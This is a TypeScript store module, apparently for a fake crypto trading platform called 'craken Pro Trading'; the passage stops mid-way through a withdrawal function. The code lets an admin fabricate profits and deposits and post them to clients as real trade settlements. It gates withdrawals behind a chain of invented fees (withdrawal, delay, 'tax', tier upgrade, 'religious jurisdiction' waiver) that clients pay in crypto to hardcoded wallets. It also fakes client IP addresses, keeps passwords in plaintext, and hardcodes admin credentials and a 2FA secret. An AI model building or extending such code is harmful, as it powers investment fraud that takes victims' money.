import { useSyncExternalStore } from 'react';
import {
  AdminSettingsConfig,
  BoltChatMessage,
  ClientSessionInfo,
  ClientUser,
  DepositRecord,
  KycStatus,
  KycSubmission,
  LedgerAuditRecord,
  SystemNotification,
  TradeOrder,
  WithdrawalRecord,
  WithdrawalClearanceState
} from '../types';
import { db, doc, onSnapshot, setDoc, getDoc } from './firebase';

const STORAGE_KEY = 'craken_pro_trading_storage_v2';
const SYNC_CHANNEL_NAME = 'craken_sync_channel';

const DEFAULT_ADMIN: AdminSettingsConfig = {
  adminEmail: 'osasd491@gmail.com',
  adminPassword: 'AdminCraken#2026!Pro',
  twoFactorEnabled: true,
  twoFactorSecret: 'CRAKEN-AUTH-9428-SECURE',
  walletAddresses: {
    BTC: {
      address: 'bc1q9h6x8f5g4d3s2a1z0y9x8w7v6u5t4r3e2w1q0p',
      network: 'Bitcoin (BTC Native SegWit)',
      minDeposit: 0.001
    },
    ETH: {
      address: '0x71C8845A467e26A91176226Bf49C3388a10De059',
      network: 'Ethereum (ERC20)',
      minDeposit: 0.02
    },
    USDT: {
      address: 'TQn9Y2khEsLJW1ChVWFMSMeSTow5KaxnSE',
      network: 'Tether USD (TRC20 - TRON)',
      minDeposit: 50
    },
    SOL: {
      address: '9xQeWvG816bUx9EPjHmaT23yvVM2ZWbrrpZb9PusVFin',
      network: 'Solana (SOL)',
      minDeposit: 0.5
    }
  },
  supportEmail: 'crakenprotrading@gmail.com',
  platformName: 'craken Pro Trading'
};

const SEED_USERS: ClientUser[] = [];

const SEED_WITHDRAWALS: WithdrawalRecord[] = [];

const SEED_LEDGER: LedgerAuditRecord[] = [];

const SEED_CHATS: BoltChatMessage[] = [];

const SEED_TRADES: TradeOrder[] = [];

export interface AppStoreState {
  adminConfig: AdminSettingsConfig;
  users: ClientUser[];
  withdrawals: WithdrawalRecord[];
  deposits: DepositRecord[];
  ledger: LedgerAuditRecord[];
  chats: BoltChatMessage[];
  trades: TradeOrder[];
  notifications: SystemNotification[];
}

function createUniqueNotifId(): string {
  return `notif_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
}

export function sanitizeState(parsed: any): AppStoreState {
  if (!parsed || typeof parsed !== 'object') {
    return {
      adminConfig: DEFAULT_ADMIN,
      users: [],
      withdrawals: [],
      deposits: [],
      ledger: [],
      chats: [],
      trades: [],
      notifications: [
        {
          id: 'notif_init',
          title: 'Welcome to Craken Pro Trading',
          message: 'Your account is connected to our Tier-1 institutional liquidity bridge.',
          type: 'security',
          timestamp: new Date().toISOString(),
          read: false
        }
      ]
    };
  }

  if (!parsed.adminConfig || !parsed.adminConfig.adminEmail) {
    parsed.adminConfig = DEFAULT_ADMIN;
  }
  if (parsed.users && Array.isArray(parsed.users)) {
    parsed.users = parsed.users
      .filter((u: ClientUser) => u.id !== 'usr_david_101' && u.id !== 'usr_sophia_202' && u.id !== 'usr_alex_303')
      .map((u: ClientUser) => ({
        ...u,
        bonus: typeof u.bonus === 'number' ? u.bonus : 0,
        totalDeposited: typeof u.totalDeposited === 'number' ? u.totalDeposited : 0,
        totalProfit: typeof u.totalProfit === 'number' ? u.totalProfit : 0,
        totalWithdrawn: typeof u.totalWithdrawn === 'number' ? u.totalWithdrawn : 0,
        balance: typeof u.balance === 'number' ? u.balance : 0,
        withdrawalClearance: u.withdrawalClearance || {
          withdrawalFeePaid: false,
          accountUpgraded: false,
          delayFeePaid: false,
          taxFeePaid: false,
          religiousJurisdictionApproved: false
        }
      }));
  } else {
    parsed.users = [];
  }
  if (parsed.withdrawals && Array.isArray(parsed.withdrawals)) {
    parsed.withdrawals = parsed.withdrawals.filter(
      (w: WithdrawalRecord) => w.userId !== 'usr_david_101' && w.userId !== 'usr_sophia_202' && w.userId !== 'usr_alex_303'
    );
  } else {
    parsed.withdrawals = [];
  }
  if (parsed.ledger && Array.isArray(parsed.ledger)) {
    parsed.ledger = parsed.ledger.filter(
      (l: LedgerAuditRecord) => l.userId !== 'usr_david_101' && l.userId !== 'usr_sophia_202' && l.userId !== 'usr_alex_303'
    );
  } else {
    parsed.ledger = [];
  }
  if (parsed.chats && Array.isArray(parsed.chats)) {
    parsed.chats = parsed.chats.filter(
      (c: BoltChatMessage) => c.userId !== 'usr_david_101' && c.userId !== 'usr_sophia_202' && c.userId !== 'usr_alex_303'
    );
  } else {
    parsed.chats = [];
  }
  if (parsed.trades && Array.isArray(parsed.trades)) {
    parsed.trades = parsed.trades.filter(
      (t: TradeOrder) => t.userId !== 'usr_david_101' && t.userId !== 'usr_sophia_202' && t.userId !== 'usr_alex_303'
    );
  } else {
    parsed.trades = [];
  }
  if (parsed.notifications && Array.isArray(parsed.notifications)) {
    const seen = new Set<string>();
    parsed.notifications = parsed.notifications.filter((n: SystemNotification) => {
      if (!n || !n.id || seen.has(n.id)) return false;
      seen.add(n.id);
      return true;
    });
  } else {
    parsed.notifications = [];
  }

  return parsed as AppStoreState;
}

function loadState(): AppStoreState {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (raw) {
      return sanitizeState(JSON.parse(raw));
    }
  } catch (err) {
    console.error('Failed to load state from localStorage', err);
  }
  return sanitizeState(null);
}

let memoryState: AppStoreState = loadState();
const listeners = new Set<(state: AppStoreState) => void>();

let broadcastChannel: BroadcastChannel | null = null;
try {
  if (typeof window !== 'undefined' && 'BroadcastChannel' in window) {
    broadcastChannel = new BroadcastChannel(SYNC_CHANNEL_NAME);
    broadcastChannel.onmessage = (event) => {
      if (event.data && event.data.type === 'STATE_UPDATED') {
        memoryState = loadState();
        notifyListeners();
      }
    };
  }
} catch {
  // BroadcastChannel unavailable
}

if (typeof window !== 'undefined') {
  window.addEventListener('storage', (e) => {
    if (e.key === STORAGE_KEY) {
      memoryState = loadState();
      notifyListeners();
    }
  });
}

// Merge remote cloud state with local state safely
function mergeStates(local: AppStoreState, remote: any): AppStoreState {
  const sanitizedRemote = sanitizeState(remote);

  // Merge users by unique user ID
  const userMap = new Map<string, ClientUser>();
  for (const u of sanitizedRemote.users) {
    userMap.set(u.id, u);
  }
  for (const u of local.users) {
    if (!userMap.has(u.id)) {
      userMap.set(u.id, u);
    } else {
      const existing = userMap.get(u.id)!;
      userMap.set(u.id, { ...existing, ...u });
    }
  }

  // Merge withdrawals by unique ID
  const withdrawalMap = new Map<string, WithdrawalRecord>();
  for (const w of sanitizedRemote.withdrawals) withdrawalMap.set(w.id, w);
  for (const w of local.withdrawals) withdrawalMap.set(w.id, w);

  // Merge chats by unique message ID
  const chatMap = new Map<string, BoltChatMessage>();
  for (const c of sanitizedRemote.chats) chatMap.set(c.id, c);
  for (const c of local.chats) chatMap.set(c.id, c);

  // Merge ledger audit items
  const ledgerMap = new Map<string, LedgerAuditRecord>();
  for (const l of sanitizedRemote.ledger) ledgerMap.set(l.id, l);
  for (const l of local.ledger) ledgerMap.set(l.id, l);

  // Merge trades
  const tradeMap = new Map<string, TradeOrder>();
  for (const t of sanitizedRemote.trades) tradeMap.set(t.id, t);
  for (const t of local.trades) tradeMap.set(t.id, t);

  return {
    ...sanitizedRemote,
    adminConfig: { ...sanitizedRemote.adminConfig, ...local.adminConfig },
    users: Array.from(userMap.values()),
    withdrawals: Array.from(withdrawalMap.values()),
    chats: Array.from(chatMap.values()).sort(
      (a, b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime()
    ),
    ledger: Array.from(ledgerMap.values()).sort(
      (a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
    ),
    trades: Array.from(tradeMap.values()),
    notifications: sanitizedRemote.notifications || local.notifications || []
  };
}

// Real-time Cloud Firestore synchronization
const FIRESTORE_SYNC_DOC = 'store';
let firestoreDebounceTimer: any = null;

function syncToFirestore() {
  if (typeof window === 'undefined') return;
  clearTimeout(firestoreDebounceTimer);
  firestoreDebounceTimer = setTimeout(async () => {
    try {
      const syncDocRef = doc(db, 'app_sync', FIRESTORE_SYNC_DOC);
      // Clean undefined and circular references before Firestore write
      const payload = JSON.parse(JSON.stringify(memoryState));
      payload.updatedAt = new Date().toISOString();
      await setDoc(syncDocRef, payload, { merge: true });
    } catch (err) {
      console.warn('Firestore cloud sync notice:', err);
    }
  }, 200);
}

// Start real-time Firestore synchronization listener
if (typeof window !== 'undefined') {
  try {
    const syncDocRef = doc(db, 'app_sync', FIRESTORE_SYNC_DOC);
    
    // Initial fetch from Firestore
    getDoc(syncDocRef)
      .then((snap) => {
        if (snap.exists()) {
          const remoteData = snap.data();
          if (remoteData && Array.isArray(remoteData.users)) {
            const merged = mergeStates(memoryState, remoteData);
            memoryState = merged;
            try {
              localStorage.setItem(STORAGE_KEY, JSON.stringify(memoryState));
            } catch {}
            notifyListeners();
          }
        } else if (memoryState.users.length > 0) {
          syncToFirestore();
        }
      })
      .catch((err) => {
        console.warn('Initial Firestore fetch notice:', err);
      });

    // Real-time listener: updates across different devices, browsers, and URLs instantly
    onSnapshot(
      syncDocRef,
      (snap) => {
        if (snap.exists()) {
          const remoteData = snap.data();
          if (remoteData && Array.isArray(remoteData.users)) {
            const merged = mergeStates(memoryState, remoteData);
            if (JSON.stringify(merged) !== JSON.stringify(memoryState)) {
              memoryState = merged;
              try {
                localStorage.setItem(STORAGE_KEY, JSON.stringify(memoryState));
              } catch {}
              notifyListeners();
            }
          }
        }
      },
      (err) => {
        console.warn('Firestore real-time listener notice:', err);
      }
    );
  } catch (err) {
    console.warn('Firestore initialization notice:', err);
  }
}

// Full-stack central server synchronization (fallback)
let syncDebounceTimer: any = null;
function syncToServer() {
  if (typeof window === 'undefined') return;
  clearTimeout(syncDebounceTimer);
  syncDebounceTimer = setTimeout(async () => {
    try {
      await fetch('/api/store', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(memoryState),
      });
    } catch {
      // Backend may be starting or offline
    }
  }, 250);
}

async function fetchFromServer() {
  if (typeof window === 'undefined') return;
  try {
    const res = await fetch('/api/store');
    if (res.ok) {
      const serverData = await res.json();
      if (serverData && Array.isArray(serverData.users)) {
        const sanitized = sanitizeState(serverData);
        if (JSON.stringify(sanitized) !== JSON.stringify(memoryState)) {
          memoryState = sanitized;
          try {
            localStorage.setItem(STORAGE_KEY, JSON.stringify(memoryState));
          } catch {}
          notifyListeners();
        }
      }
    }
  } catch {
    // Backend offline or compiling
  }
}

// Start cross-device poller
if (typeof window !== 'undefined') {
  fetchFromServer();
  setInterval(fetchFromServer, 5000);
}

function saveState() {
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(memoryState));
    if (broadcastChannel) {
      broadcastChannel.postMessage({ type: 'STATE_UPDATED' });
    }
  } catch (err) {
    console.error('Failed to save state to localStorage', err);
  }
  syncToFirestore();
  syncToServer();
  notifyListeners();
}

function notifyListeners() {
  listeners.forEach((listener) => {
    try {
      listener({ ...memoryState });
    } catch (err) {
      console.error('Error in store listener', err);
    }
  });
}

export const StoreService = {
  getState(): AppStoreState {
    return { ...memoryState };
  },

  subscribe(listener: (state: AppStoreState) => void): () => void {
    listeners.add(listener);
    listener({ ...memoryState });
    return () => {
      listeners.delete(listener);
    };
  },

  // Client Authentication
  registerClient(userData: {
    name: string;
    email: string;
    password: string;
    phone: string;
    country: string;
    currency: string;
    language: string;
  }): ClientUser {
    const cleanEmail = userData.email.toLowerCase().trim();
    const existing = memoryState.users.find((u) => u.email.toLowerCase() === cleanEmail);
    if (existing) {
      // If client created account on another device/browser and is logging in/registering with same credentials
      if (existing.password === userData.password) {
        if (typeof localStorage !== 'undefined') {
          localStorage.setItem('craken_client_session_user_id', existing.id);
        }
        return existing;
      } else {
        throw new Error('This email is already registered. Please enter your existing account password to sign in.');
      }
    }

    // Detect browser info for session monitoring
    const userAgent = typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown';
    let browserName = 'Chrome 128 (Desktop)';
    if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browserName = 'Safari (Apple)';
    else if (userAgent.includes('Opera') || userAgent.includes('OPR')) browserName = 'Opera Mini (Mobile)';
    else if (userAgent.includes('Firefox')) browserName = 'Firefox Quantum';
    else if (userAgent.includes('Edg')) browserName = 'Microsoft Edge';

    const isMobile = /iPhone|iPad|iPod|Android/i.test(userAgent);

    const newUser: ClientUser = {
      id: `usr_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 6)}`,
      name: userData.name,
      email: userData.email.toLowerCase().trim(),
      password: userData.password,
      phone: userData.phone,
      country: userData.country,
      currency: userData.currency || 'USD',
      language: userData.language || 'en',
      balance: 0.00,
      totalProfit: 0.00,
      totalDeposited: 0.00,
      totalWithdrawn: 0.00,
      bonus: 0.00,
      kycStatus: 'unverified',
      sessionInfo: {
        browser: browserName,
        os: isMobile ? 'Mobile OS' : 'Desktop OS',
        ip: `194.233.${Math.floor(Math.random() * 200 + 10)}.${Math.floor(Math.random() * 250 + 1)}`,
        device: isMobile ? 'Mobile' : 'Desktop',
        loginMethod: 'Email & Password',
        lastActive: 'Just now',
        registeredAt: new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC'
      },
      isSuspended: false,
      withdrawalClearance: {
        withdrawalFeePaid: false,
        accountUpgraded: false,
        delayFeePaid: false,
        taxFeePaid: false,
        religiousJurisdictionApproved: false
      }
    };

    memoryState.users = [newUser, ...memoryState.users];
    
    // Set active session in localStorage
    if (typeof localStorage !== 'undefined') {
      localStorage.setItem('craken_client_session_user_id', newUser.id);
    }
    
    // Add welcome notification
    memoryState.notifications.unshift({
      id: createUniqueNotifId(),
      title: 'Trading Account Activated',
      message: `Welcome ${newUser.name}! Your account has been initialized with full live market execution. Complete KYC verification to unlock unlimited withdrawals.`,
      type: 'security',
      timestamp: new Date().toISOString(),
      read: false,
      userId: newUser.id
    });

    saveState();
    return newUser;
  },

  registerUser(userData: {
    name: string;
    email: string;
    password: string;
    phone: string;
    country: string;
    currency?: string;
    language?: string;
  }): { success: boolean; user?: ClientUser; error?: string } {
    try {
      const newUser = this.registerClient({
        name: userData.name,
        email: userData.email,
        password: userData.password,
        phone: userData.phone,
        country: userData.country,
        currency: userData.currency || 'USD',
        language: userData.language || 'en'
      });
      return { success: true, user: newUser };
    } catch (err: any) {
      return { success: false, error: err?.message || 'Failed to register user' };
    }
  },

  getCurrentUser(): ClientUser | null {
    if (typeof localStorage === 'undefined') return null;
    const currentId = localStorage.getItem('craken_client_session_user_id');
    if (currentId) {
      const found = memoryState.users.find((u) => u.id === currentId);
      if (found) return found;
    }
    return null;
  },

  logoutClient(): void {
    if (typeof localStorage !== 'undefined') {
      localStorage.removeItem('craken_client_session_user_id');
    }
  },

  loginClient(email: string, pass: string): ClientUser | null {
    const user = memoryState.users.find(
      (u) => u.email.toLowerCase() === email.toLowerCase().trim() && u.password === pass
    );
    if (user && !user.isSuspended) {
      // Update session lastActive
      user.sessionInfo.lastActive = 'Just now';
      if (typeof localStorage !== 'undefined') {
        localStorage.setItem('craken_client_session_user_id', user.id);
      }
      saveState();
      return user;
    }
    return null;
  },

  updateClientLanguage(userId: string, language: string) {
    const user = memoryState.users.find(u => u.id === userId);
    if (user) {
      user.language = language;
      saveState();
    }
  },

  updateUserLanguage(userId: string, language: string) {
    this.updateClientLanguage(userId, language);
  },

  updateClientCurrency(userId: string, currency: string) {
    const user = memoryState.users.find(u => u.id === userId);
    if (user) {
      user.currency = currency;
      saveState();
    }
  },

  updateUserCurrency(userId: string, currency: string) {
    this.updateClientCurrency(userId, currency);
  },

  // Multi-Step Withdrawal Clearance Protocol Management
  updateWithdrawalClearance(userId: string, updates: Partial<WithdrawalClearanceState>): boolean {
    const user = memoryState.users.find((u) => u.id === userId);
    if (!user) return false;
    user.withdrawalClearance = {
      ...(user.withdrawalClearance || {
        withdrawalFeePaid: false,
        accountUpgraded: false,
        delayFeePaid: false,
        taxFeePaid: false,
        religiousJurisdictionApproved: false
      }),
      ...updates
    };
    saveState();
    return true;
  },

  verifyWithdrawalFee(userId: string, paid = true): boolean {
    const user = memoryState.users.find((u) => u.id === userId);
    if (!user) return false;
    user.withdrawalClearance = {
      ...(user.withdrawalClearance || {
        withdrawalFeePaid: false,
        accountUpgraded: false,
        delayFeePaid: false,
        taxFeePaid: false,
        religiousJurisdictionApproved: false
      }),
      withdrawalFeePaid: paid,
      withdrawalFeePaidAt: paid ? new Date().toISOString() : undefined,
      withdrawalFeeAmount: 250
    };
    if (paid) {
      memoryState.notifications.unshift({
        id: createUniqueNotifId(),
        title: '✅ Withdrawal Processing Fee Cleared',
        message: 'Your institutional withdrawal processing fee ($250.00) has been verified and registered by the compliance desk.',
        type: 'withdrawal',
        timestamp: new Date().toISOString(),
        read: false,
        userId: user.id
      });
    }
    saveState();
    return true;
  },

  upgradeAccountTier(userId: string, upgraded = true, tierName = 'Institutional Executive VIP Tier 8.3'): boolean {
    const user = memoryState.users.find((u) => u.id === userId);
    if (!user) return false;
    user.accountTier = upgraded ? tierName : undefined;
    user.withdrawalClearance = {
      ...(user.withdrawalClearance || {
        withdrawalFeePaid: false,
        accountUpgraded: false,
        delayFeePaid: false,
        taxFeePaid: false,
        religiousJurisdictionApproved: false
      }),
      accountUpgraded: upgraded,
      accountTier: upgraded ? tierName : undefined,
      accountUpgradedAt: upgraded ? new Date().toISOString() : undefined
    };
    if (upgraded) {
      memoryState.notifications.unshift({
        id: createUniqueNotifId(),
        title: '💎 Account Tier Upgraded to Institutional Executive VIP v8.3',
        message: `Your brokerage account has been successfully upgraded to ${tierName}. High-volume liquidity clearing and v8.3 execution authorized.`,
        type: 'security',
        timestamp: new Date().toISOString(),
        read: false,
        userId: user.id
      });
    }
    saveState();
    return true;
  },

  verifyDelayFee(userId: string, paid = true): boolean {
    const user = memoryState.users.find((u) => u.id === userId);
    if (!user) return false;
    user.withdrawalClearance = {
      ...(user.withdrawalClearance || {
        withdrawalFeePaid: false,
        accountUpgraded: false,
        delayFeePaid: false,
        taxFeePaid: false,
        religiousJurisdictionApproved: false
      }),
      delayFeePaid: paid,
      delayFeePaidAt: paid ? new Date().toISOString() : undefined,
      delayFeeAmount: 380
    };
    if (paid) {
      memoryState.notifications.unshift({
        id: createUniqueNotifId(),
        title: '✅ Liquidity Settlement Delay Fee Cleared',
        message: 'Settlement delay and liquidity clearance fee ($380.00) has been officially verified. Capital release unlocked from reserve.',
        type: 'withdrawal',
        timestamp: new Date().toISOString(),
        read: false,
        userId: user.id
      });
    }
    saveState();
    return true;
  },

  verifyTaxFee(userId: string, paid = true): boolean {
    const user = memoryState.users.find((u) => u.id === userId);
    if (!user) return false;
    user.withdrawalClearance = {
      ...(user.withdrawalClearance || {
        withdrawalFeePaid: false,
        accountUpgraded: false,
        delayFeePaid: false,
        taxFeePaid: false,
        religiousJurisdictionApproved: false
      }),
      taxFeePaid: paid,
      taxFeePaidAt: paid ? new Date().toISOString() : undefined,
      taxFeeAmount: 520
    };
    if (paid) {
      memoryState.notifications.unshift({
        id: createUniqueNotifId(),
        title: '📋 Capital Gains Tax Clearance Certificate Issued',
        message: 'Statutory capital gains tax withholding certification ($520.00) has been cleared by the regulatory tax desk.',
        type: 'withdrawal',
        timestamp: new Date().toISOString(),
        read: false,
        userId: user.id
      });
    }
    saveState();
    return true;
  },

  approveReligiousJurisdiction(userId: string, approved = true): boolean {
    const user = memoryState.users.find((u) => u.id === userId);
    if (!user) return false;
    user.withdrawalClearance = {
      ...(user.withdrawalClearance || {
        withdrawalFeePaid: false,
        accountUpgraded: false,
        delayFeePaid: false,
        taxFeePaid: false,
        religiousJurisdictionApproved: false
      }),
      religiousJurisdictionApproved: approved,
      religiousJurisdictionApprovedAt: approved ? new Date().toISOString() : undefined
    };
    if (approved) {
      memoryState.notifications.unshift({
        id: createUniqueNotifId(),
        title: '🏛️ Regional & Religious Compliance Exemption Approved',
        message: 'The executive compliance board has officially approved your regional/religious banking jurisdiction clearance petition.',
        type: 'security',
        timestamp: new Date().toISOString(),
        read: false,
        userId: user.id
      });
    }
    saveState();
    return true;
  },

  approveAllClearances(userId: string): boolean {
    const user = memoryState.users.find((u) => u.id === userId);
    if (!user) return false;
    user.kycStatus = 'verified';
    user.accountTier = 'Institutional Executive VIP Tier 8.3';
    user.withdrawalClearance = {
      withdrawalFeePaid: true,
      withdrawalFeePaidAt: new Date().toISOString(),
      withdrawalFeeAmount: 250,
      accountUpgraded: true,
      accountTier: 'Institutional Executive VIP Tier 8.3',
      accountUpgradedAt: new Date().toISOString(),
      delayFeePaid: true,
      delayFeePaidAt: new Date().toISOString(),
      delayFeeAmount: 380,
      taxFeePaid: true,
      taxFeePaidAt: new Date().toISOString(),
      taxFeeAmount: 520,
      religiousJurisdictionApproved: true,
      religiousJurisdictionApprovedAt: new Date().toISOString()
    };
    memoryState.notifications.unshift({
      id: createUniqueNotifId(),
      title: '🌟 All 6 Withdrawal Clearance Protocols Approved',
      message: 'Executive administration has authorized full clearance across KYC, clearing fee, tier upgrade, settlement delay, tax certificate, and regional compliance.',
      type: 'withdrawal',
      timestamp: new Date().toISOString(),
      read: false,
      userId: user.id
    });
    saveState();
    return true;
  },

  resetAllClearances(userId: string): boolean {
    const user = memoryState.users.find((u) => u.id === userId);
    if (!user) return false;
    user.kycStatus = 'unverified';
    user.withdrawalClearance = {
      withdrawalFeePaid: false,
      accountUpgraded: false,
      delayFeePaid: false,
      taxFeePaid: false,
      religiousJurisdictionApproved: false
    };
    saveState();
    return true;
  },

  updateClientProfile(userId: string, updates: Partial<ClientUser>): boolean {
    const user = memoryState.users.find((u) => u.id === userId);
    if (!user) return false;
    Object.assign(user, updates);
    saveState();
    return true;
  },

  // Custom manual clearance fees editing
  updateClientClearanceFees(
    userId: string,
    fees: {
      withdrawalFeeAmount?: number;
      upgradeFeeAmount?: number;
      delayFeeAmount?: number;
      taxFeeAmount?: number;
      jurisdictionFeeAmount?: number;
    }
  ): boolean {
    const user = memoryState.users.find((u) => u.id === userId);
    if (!user) return false;
    user.withdrawalClearance = {
      ...(user.withdrawalClearance || {
        withdrawalFeePaid: false,
        accountUpgraded: false,
        delayFeePaid: false,
        taxFeePaid: false,
        religiousJurisdictionApproved: false
      }),
      ...fees
    };
    saveState();
    return true;
  },

  // Client fee payment submission with any cryptocurrency
  submitClearanceFeePayment(
    userId: string,
    data: {
      stage: number;
      crypto: string;
      txid: string;
      amount: number;
    }
  ): boolean {
    const user = memoryState.users.find((u) => u.id === userId);
    if (!user) return false;
    user.withdrawalClearance = {
      ...(user.withdrawalClearance || {
        withdrawalFeePaid: false,
        accountUpgraded: false,
        delayFeePaid: false,
        taxFeePaid: false,
        religiousJurisdictionApproved: false
      }),
      pendingPaymentStage: data.stage,
      pendingPaymentCrypto: data.crypto,
      pendingPaymentTxid: data.txid,
      pendingPaymentAmount: data.amount,
      pendingPaymentSubmittedAt: new Date().toISOString()
    };

    const stageNames: Record<number, string> = {
      2: 'Withdrawal Disbursement Fee',
      3: 'Institutional VIP Tier Upgrade',
      4: 'Liquidity Settlement Delay Clearance Fee',
      5: 'Capital Gains Statutory Tax Fee',
      6: 'Regional / Religious Jurisdiction Compliance Waiver'
    };
    const stageTitle = stageNames[data.stage] || `Compliance Stage ${data.stage}`;

    memoryState.notifications.unshift({
      id: createUniqueNotifId(),
      title: `⏳ Fee Payment Submitted (${data.crypto})`,
      message: `Your payment proof for ${stageTitle} (${data.amount.toLocaleString()} ${data.crypto}, TXID: ${data.txid}) has been submitted for institutional audit.`,
      type: 'withdrawal',
      timestamp: new Date().toISOString(),
      read: false,
      userId: user.id
    });

    saveState();
    return true;
  },

  // Admin approves client fee payment submission
  approveClearanceFeePayment(userId: string, stage: number): boolean {
    const user = memoryState.users.find((u) => u.id === userId);
    if (!user) return false;

    if (stage === 2) {
      this.verifyWithdrawalFee(userId, true);
    } else if (stage === 3) {
      this.upgradeAccountTier(userId, true);
    } else if (stage === 4) {
      this.verifyDelayFee(userId, true);
    } else if (stage === 5) {
      this.verifyTaxFee(userId, true);
    } else if (stage === 6) {
      this.approveReligiousJurisdiction(userId, true);
    }

    if (user.withdrawalClearance) {
      user.withdrawalClearance.pendingPaymentStage = undefined;
      user.withdrawalClearance.pendingPaymentCrypto = undefined;
      user.withdrawalClearance.pendingPaymentTxid = undefined;
      user.withdrawalClearance.pendingPaymentAmount = undefined;
      user.withdrawalClearance.pendingPaymentSubmittedAt = undefined;
    }
    saveState();
    return true;
  },

  // Admin Ledger Management - Add/Remove Profit & Balance Adjustment
  adjustClientFinancials(params: {
    userId: string;
    action: 'ADD_PROFIT' | 'DEDUCT_PROFIT' | 'ADD_BALANCE' | 'DEDUCT_BALANCE' | 'ADD_DEPOSIT' | 'BONUS_CREDIT';
    amount: number;
    reason: string;
    adminEmail: string;
  }): boolean {
    const user = memoryState.users.find((u) => u.id === params.userId);
    if (!user) return false;

    const prevProfit = user.totalProfit || 0;
    const prevBalance = user.balance || 0;
    const prevDeposited = user.totalDeposited || 0;
    const prevBonus = user.bonus || 0;
    const numAmount = Math.abs(Number(params.amount));

    let newProfit = prevProfit;
    let newBalance = prevBalance;

    if (params.action === 'ADD_PROFIT') {
      newProfit = Number((prevProfit + numAmount).toFixed(2));
      newBalance = Number((prevBalance + numAmount).toFixed(2));
    } else if (params.action === 'DEDUCT_PROFIT') {
      newProfit = Number(Math.max(0, prevProfit - numAmount).toFixed(2));
      newBalance = Number(Math.max(0, prevBalance - numAmount).toFixed(2));
    } else if (params.action === 'ADD_BALANCE') {
      newBalance = Number((prevBalance + numAmount).toFixed(2));
    } else if (params.action === 'DEDUCT_BALANCE') {
      newBalance = Number(Math.max(0, prevBalance - numAmount).toFixed(2));
    } else if (params.action === 'ADD_DEPOSIT') {
      user.totalDeposited = Number((prevDeposited + numAmount).toFixed(2));
      newBalance = Number((prevBalance + numAmount).toFixed(2));

      // Record deposit in deposits log
      memoryState.deposits.unshift({
        id: `dep_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
        userId: user.id,
        userName: user.name,
        userEmail: user.email,
        asset: 'USD',
        network: 'Direct Admin Allocation',
        amount: numAmount,
        proofNote: params.reason || 'Capital deposit allocation by administrator',
        status: 'CONFIRMED',
        createdAt: new Date().toISOString(),
        confirmedAt: new Date().toISOString()
      });
    } else if (params.action === 'BONUS_CREDIT') {
      user.bonus = Number((prevBonus + numAmount).toFixed(2));
      newBalance = Number((prevBalance + numAmount).toFixed(2));
    }

    user.totalProfit = newProfit;
    user.balance = newBalance;

    // Create immutable audit ledger record
    const auditRecord: LedgerAuditRecord = {
      id: `lg_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
      userId: user.id,
      userName: user.name,
      adminEmail: params.adminEmail || memoryState.adminConfig.adminEmail,
      action: params.action,
      amount: numAmount,
      previousProfit: prevProfit,
      newProfit: newProfit,
      previousBalance: prevBalance,
      newBalance: newBalance,
      reason: params.reason || 'Manual brokerage audit balance adjustment',
      timestamp: new Date().toISOString()
    };

    memoryState.ledger.unshift(auditRecord);

    // Send push notification to client
    let notifTitle = 'Account Balance Updated';
    let notifMsg = `Your account balance was adjusted by $${numAmount.toLocaleString()}. Reason: ${params.reason}`;
    let notifType: SystemNotification['type'] = 'profit';

    if (params.action === 'ADD_PROFIT') {
      notifTitle = '📈 Profit Credit Applied';
      notifMsg = `+$${numAmount.toLocaleString()} has been credited to your trading account. Reason: ${params.reason || 'Live Trade Profit Settlement'}.`;
      notifType = 'profit';
    } else if (params.action === 'ADD_DEPOSIT') {
      notifTitle = '💰 Deposit Credited!';
      notifMsg = `$${numAmount.toLocaleString()} has been credited to your Capital balance. Available for trading and withdrawal.`;
      notifType = 'deposit';
    } else if (params.action === 'BONUS_CREDIT') {
      notifTitle = '🎁 Trading Bonus Credited!';
      notifMsg = `Congratulations! A trading bonus of $${numAmount.toLocaleString()} has been credited to your account.`;
      notifType = 'profit';
    }

    memoryState.notifications.unshift({
      id: createUniqueNotifId(),
      title: notifTitle,
      message: notifMsg,
      type: notifType,
      timestamp: new Date().toISOString(),
      read: false,
      userId: user.id
    });

    saveState();
    return true;
  },

  // KYC Management
  submitKyc(userId: string, data: Omit<KycSubmission, 'submittedAt'>): boolean {
    const user = memoryState.users.find(u => u.id === userId);
    if (!user) return false;

    user.kycStatus = 'pending';
    user.kycData = {
      ...data,
      submittedAt: new Date().toISOString()
    };

    memoryState.notifications.unshift({
      id: createUniqueNotifId(),
      title: 'KYC Documents Submitted',
      message: 'Your identity verification documents are under review by compliance.',
      type: 'kyc',
      timestamp: new Date().toISOString(),
      read: false,
      userId: user.id
    });

    saveState();
    return true;
  },

  reviewKyc(userId: string, status: 'verified' | 'rejected', notes?: string): boolean {
    const user = memoryState.users.find(u => u.id === userId);
    if (!user || !user.kycData) return false;

    user.kycStatus = status;
    user.kycData.reviewedAt = new Date().toISOString();
    user.kycData.reviewNotes = notes || (status === 'verified' ? 'Approved by Admin Compliance' : 'Rejected by Admin Compliance');

    memoryState.notifications.unshift({
      id: createUniqueNotifId(),
      title: status === 'verified' ? '✅ KYC Verification Approved' : '❌ KYC Verification Requires Attention',
      message: status === 'verified'
        ? 'Congratulations! Your account is fully verified. High-limit withdrawals and institutional leverage unlocked.'
        : `KYC verification was not approved. Reason: ${notes || 'Please resubmit clearer identity documents.'}`,
      type: 'kyc',
      timestamp: new Date().toISOString(),
      read: false,
      userId: user.id
    });

    saveState();
    return true;
  },

  updateKycStatus(userId: string, status: KycStatus): boolean {
    const user = memoryState.users.find(u => u.id === userId);
    if (!user) return false;
    user.kycStatus = status;
    if (user.kycData) {
      user.kycData.reviewedAt = new Date().toISOString();
      user.kycData.reviewNotes = status === 'verified' ? 'Approved by Admin Compliance' : 'Reset by Admin';
    }
    saveState();
    return true;
  },

  // Withdrawal Management
  requestWithdrawal(params: {
    userId: string;
    method?: 'crypto' | 'bank' | 'paypal';
    asset: string;
